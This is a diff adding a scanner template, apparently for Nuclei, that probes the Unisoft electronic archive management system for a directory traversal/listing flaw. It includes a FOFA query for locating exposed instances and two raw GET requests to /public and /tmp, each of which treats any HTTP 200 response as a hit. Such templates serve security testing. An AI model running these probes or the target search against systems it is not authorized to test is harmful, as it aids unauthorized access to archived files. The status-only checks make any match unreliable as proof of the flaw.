@@ -1,0 +1,34 @@
+id: poc-wgr2y7sbe20u2beg
+info:
+  name: 紫光电子档案管理系统public存在目录遍历漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgr2y7sbe20u2beg'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wgr2y7sbe20u2beg
+    fofa: title="紫光档案管理系统" || body="紫光软件系统有限公司 Copyright©"||body="www.unissoft.com"
+http:
+- raw:
+  - 'GET /public HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /tmp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
